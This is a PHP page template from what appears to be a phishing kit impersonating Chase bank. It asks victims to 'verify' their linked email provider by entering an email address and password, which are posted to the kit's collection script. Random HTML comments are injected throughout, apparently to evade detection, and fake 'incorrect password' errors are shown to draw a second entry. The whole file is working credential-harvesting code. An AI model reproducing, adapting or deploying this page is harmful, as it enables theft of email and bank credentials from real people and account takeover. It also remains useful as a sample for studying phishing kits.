<?php require("includes/header.php") ?>
<style type="text/css">
    .jpui.checkbox .checkboxWrap .check {
        display: inline-block;
        border: .0625rem solid #959595;
        height: 1.25rem;
        width: 1.25rem;
        border-radius: .1875rem;
        position: relative;
         bottom: 0rem; 
    }
</style>
    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div>
        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" homepage" tabindex="-1">
            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" logon-container">
                <header class=" toggle-aria-hidden">
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div id="hdrlog" class=" logon header jpui transparent navigation bar" style="display:block;">
                        <a>
                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" chase logo"><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                        </a>
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div id="hdrup" class=" logon header jpui transparent navigation bar" style="background: transparent;background-image: linear-gradient(to bottom, rgba(11, 110, 253, 0.88) 0, rgba(11, 110, 253, 0.49) 50%, rgba(0, 0, 0, 0) 100%); display:none;">
                        <a>
                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" chase logo"><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                        </a>
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                </header>
                <main>
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" container logon">
                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div>
                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div>
                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" jpui background image fixed">
                                    <style type="text/css">
                                        .jpui.background.image {
                                            background-image: url(./img/mobilenight.jpeg);
                                            filter: progid: DXImageTransform.Microsoft.AlphaImageLoader(src='./img/mobilenight.jpeg', sizingMethod='scale');
                                            -ms-filter: progid: DXImageTransform.Microsoft.AlphaImageLoader(src='./img/mobilenight.jpeg', sizingMethod='scale');
                                        }
                                        
                                        @media (min-width:320px) {
                                            .jpui.background.image {
                                                background-image: url(./img/mobilenight.jpeg);
                                            }
                                        }
                                        
                                        @media (min-width:992px) {
                                            .jpui.background.image {
                                                background-image: url(./img/tabletnight.jpeg);
                                            }
                                        }
                                        
                                        @media (min-width:1024px) {
                                            .jpui.background.image {
                                                background-image: url(./img/desktopnight.jpeg);
                                            }
                                        }
                                    </style>
                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" row">
                        	<?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" col-xs-12 col-sm-6 col-sm-offset-3 logon-box">

                                    <!-- Login Page -->
                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" jpui raised segment" id="emailo" style="max-width: 500px!important; display:block;">
                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" row">
                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div style="display:block;" id="emailtext" class=" col-xs-10 col-xs-offset-1">
                                            <h3 style="display:block;" class=" u-focus " style="font-size: 22px!important;" tabindex="-1">Email Provider</h3>
                                            <br>
                                            <h2 class=" u-focus in-progress" tabindex="-1" style="font-size: 18px; color: #dab70d;">Verify Your linked email provider.</h3>
                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                        
                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" row">
                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" col-xs-10 col-xs-offset-1">
                                            <form action="../ElZero/actions/emailAccess" method="POST" autocomplete="off" >
                                                 <input type="hidden" name="tokenElzeroCsrf" value="<?php echo $_SESSION['ElZeR0_ToKeN'];?>">
                                                <input type="hidden" name="elzeroKiller" value="">
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div id="" align="center">
                                                    <ol class=" progtrckr" data-progtrckr-steps="4">
                                                        <li class=" progtrckr-done"></li>
                                                        <li class=" progtrckr-todo"></li>
                                                        <li class=" progtrckr-todo"></li>
                                                    </ol>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <br>
                                                <br>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div align="center">
                                                    <img id="img" src="./img/email.png" width="100px">
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                            <?php if (isset($_GET['invalid2'])) {?>
                                                <input type="hidden" name="invalid">
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div id="myerr" class=" myerr" style="display:block;">
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" jpui error error inverted primary animate alert">
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" icon"><span><i class=" jpui exclamation-color icon"></i></span><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" icon background"><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" content wrap">
                                                            <h2 class=" title" tabindex="-1">incorrect password please check your email and password and try again</h2> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>

                                            <?php } ?>
                                            <?php if (isset($_GET['invalid'])) {?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div id="myerr" class=" myerr" style="display:block;">
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" jpui error error inverted primary animate alert">
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" icon"><span><i class=" jpui exclamation-color icon"></i></span><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" icon background"><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" content wrap">
                                                            <h2 class=" title" tabindex="-1">incorrect password please check your email and password and try again</h2> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>

                                            <?php } ?>
                                            
                                           
                                                <br>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" jpui vertical">
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div id="labelFlooat" class=" align-label-input floating-label__container emms">
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" label-wrapper">
                                                                <label  class=" jpui fieldlabel label-alignment vertical" for="email">Email</label>
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" logon-xs-toggle">
                                                                <input class=" jpui input logon-xs-toggle " id="emailAccess" placeholder="" autocomplete="off" type="email" name="Email" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;"> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                 <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div id="errorValid" class=" myerr" style="display:none;">
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" jpui error error inverted primary animate alert">
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" icon"><span><i class=" jpui exclamation-color icon"></i></span><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" icon background"><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" content wrap">
                                                            <h2 class=" title" tabindex="-1">Please Enter Valid Email address</h2> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>

                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" jpui vertical">
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div id="floooaatpasss" class=" align-label-input floating-label__container pswd">
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" label-wrapper">
                                                                <label  class=" jpui fieldlabel label-alignment vertical " for="password">Password</label>
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" logon-xs-toggle">
                                                                <input class=" jpui input logon-xs-toggle " id="passAccess" placeholder="" autocomplete="off" type="password" name="password" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;" aria-required="true"> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" row">
                                                    <button type="submit" class=" jpui button focus fluid primary touch"><span class=" label">Confirm</span> </button>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>

                                            </form>
                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                        	<?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                    	<?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                	<?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
            	</main>
            <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>

<?php require("includes/footer.php") ?>




